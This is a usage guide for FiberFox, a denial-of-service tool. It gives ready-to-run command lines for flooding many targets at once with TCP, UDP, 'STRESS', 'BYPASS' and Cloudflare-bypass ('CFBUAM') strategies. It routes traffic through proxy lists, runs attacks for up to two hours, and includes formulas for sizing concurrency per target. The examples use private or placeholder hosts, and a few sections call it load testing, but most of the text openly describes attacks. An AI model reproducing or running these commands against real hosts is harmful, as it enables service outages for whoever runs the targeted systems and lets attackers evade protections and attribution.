# FiberFox Multiple Targets - Practical Examples

## Example 1: Command Line Multiple Targets

```bash
# Attack 3 different targets simultaneously
fiberfox \
  --targets tcp://10.0.0.1:8080 http://10.0.0.2:80 https://10.0.0.3:443 \
  --concurrency 256 \
  --strategy STRESS \
  --duration-seconds 300
```

Each fiber will cycle through the targets, distributing load across all three.

---

## Example 2: Targets from Configuration File

**Create `targets.txt`:**
```
tcp://192.168.1.10:8080
http://192.168.1.20:80
https://192.168.1.30:443
tcp://192.168.1.40:3000
http://192.168.1.50:8081
```

**Run command:**
```bash
fiberfox \
  --targets-config targets.txt \
  --concurrency 512 \
  --strategy TCP \
  --duration-seconds 600
```

---

## Example 3: Combined - CLI + Config File

**Config file targets.txt:**
```
tcp://internal-api.local:3000
tcp://internal-db.local:5432
```

**Command line:**
```bash
fiberfox \
  --targets tcp://external-service:8080 https://cdn.example.com \
  --targets-config targets.txt \
  --concurrency 256 \
  --strategy BYPASS
```

Result: 4 targets will be attacked (2 from CLI + 2 from config)

---

## Example 4: Remote Configuration File

```bash
# Load targets from a remote server
fiberfox \
  --targets-config http://server.local/targets.txt \
  --concurrency 256 \
  --strategy GET
```

---

## Example 5: Large-Scale Testing with Multiple Targets

**Create `large_targets.txt` with 100 targets:**
```bash
for i in {1..100}; do
  echo "tcp://10.0.0.$((i % 255 + 1)):8080"
done > large_targets.txt
```

**Attack all targets:**
```bash
fiberfox \
  --targets-config large_targets.txt \
  --concurrency 2048 \
  --strategy STRESS \
  --duration-seconds 1800 \
  --rpc 500 \
  --packet-size 2048
```

This will:
- Attack 100 different targets
- Use 2048 fibers (average ~20 per target)
- Send 500 requests per connection
- Each packet is 2KB

---

## Example 6: Mixed Protocol Targets

```bash
fiberfox \
  --targets \
    tcp://localhost:8080 \
    http://127.0.0.1:80 \
    https://127.0.0.1:443 \
    tcp://192.168.1.1:3000 \
  --concurrency 512 \
  --strategy BYPASS
```

---

## Example 7: Using with Proxies

Attack multiple targets through multiple proxies:

**targets.txt:**
```
http://target1.local:8080
http://target2.local:8080
http://target3.local:8080
```

**proxies.txt:**
```
http://proxy1.local:8080
http://proxy2.local:8080
socks5://proxy3.local:1080
```

**Command:**
```bash
fiberfox \
  --targets-config targets.txt \
  --proxies-config proxies.txt \
  --concurrency 1024 \
  --strategy STRESS \
  --duration-seconds 600
```

---

## Example 8: L7 Attack on Multiple Web Services

```bash
fiberfox \
  --targets \
    https://api.service1.local \
    https://api.service2.local \
    https://api.service3.local \
  --concurrency 768 \
  --strategy CFBUAM \
  --duration-seconds 3600 \
  --rpc 1000
```

---

## Example 9: Load Distribution Across Targets

With 512 fibers and 4 targets:
- Each target gets ~128 fibers
- Fibers cycle through targets evenly
- Perfect for balanced load testing

**Configuration:**
```bash
# targets.txt with 4 IPs
echo -e "tcp://10.0.0.1:8080\ntcp://10.0.0.2:8080\ntcp://10.0.0.3:8080\ntcp://10.0.0.4:8080" > targets.txt

fiberfox \
  --targets-config targets.txt \
  --concurrency 512 \
  --strategy TCP \
  --packet-size 1024 \
  --rpc 100 \
  --duration-seconds 600
```

---

## Example 10: Long-Running Test with Many Targets

```bash
fiberfox \
  --targets-config /path/to/500_targets.txt \
  --concurrency 4096 \
  --strategy STRESS \
  --duration-seconds 7200 \
  --log-level INFO
```

---

## Performance Tuning Tips for Multiple Targets

### General Formula:
```
Fibers per target = Total Fibers / Number of Targets
Recommendation per target:
  - UDP: 1-2 fibers
  - TCP: 10-50 fibers  
  - HTTP/HTTPS: 50-200 fibers
  - Connection-based: 100-500 fibers
```

### Example Calculations:

**Scenario 1: 10 targets, UDP attack**
```
Total fibers = 10 targets × 2 = 20 fibers
fiberfox --targets-config 10targets.txt --concurrency 20 --strategy UDP
```

**Scenario 2: 10 targets, TCP attack**
```
Total fibers = 10 targets × 25 = 250 fibers
fiberfox --targets-config 10targets.txt --concurrency 250 --strategy TCP
```

**Scenario 3: 100 targets, STRESS (L7) attack**
```
Total fibers = 100 targets × 50 = 5000 fibers
fiberfox --targets-config 100targets.txt --concurrency 5000 --strategy STRESS
```

---

## Target Format Support

FiberFox automatically detects protocol from URL scheme:

| Format | Protocol |
|--------|----------|
| `127.0.0.1:8080` | TCP (default) |
| `tcp://127.0.0.1:8080` | TCP (explicit) |
| `http://example.com` | HTTP |
| `https://example.com` | HTTPS |
| `example.com` | TCP to port 80 |
| `example.com:3000` | TCP to port 3000 |

---

## Common Use Cases

### 1. Test Multiple Microservices
```bash
fiberfox \
  --targets \
    http://auth-service:3000 \
    http://api-service:3001 \
    http://web-service:3002 \
    http://db-service:5432 \
  --concurrency 512 \
  --strategy STRESS
```

### 2. Distributed Load Across Data Center
```bash
# targets.txt contains 50 servers across data center
fiberfox \
  --targets-config targets.txt \
  --concurrency 2500 \
  --strategy TCP
```

### 3. Test Behind Load Balancer
```bash
fiberfox \
  --targets https://load-balancer.local \
  --concurrency 1000 \
  --strategy BYPASS
```

### 4. Multi-Target Proxy Testing
```bash
# Test through multiple proxy chains
fiberfox \
  --targets-config targets.txt \
  --proxy-providers-config providers.json \
  --concurrency 2048
```

---

## Important Notes

1. **Target Cycling**: Fibers automatically cycle through targets using `itertools.cycle()`
2. **Even Distribution**: With N fibers and M targets, each target receives roughly N/M fibers
3. **DNS Resolution**: All targets are resolved to IPs before attack starts (uses thread pool)
4. **Error Handling**: If one target fails, other targets continue normally
5. **Statistics**: Each target has separate statistics (packets, bytes, errors, quality)

---

## Troubleshooting

**Q: Some targets not getting traffic?**
- Increase total fibers: `--concurrency 2x current_value`
- Check if targets are reachable
- Verify target ports are correct

**Q: Uneven distribution?**
- Normal with small fiber count, use at least fibers = targets × 20
- Randomness in fiber scheduling ensures eventual fairness

**Q: Memory usage too high?**
- Reduce `--concurrency` 
- Use UDP strategy (lower memory per connection)
- Increase `--duration-seconds` and reduce `--rpc`

**Q: Slow startup with many targets?**
- Set `--log-level ERROR` to reduce logging overhead
- Consider split targets across multiple runs
- Targets are resolved in parallel (10 workers) - should be fast

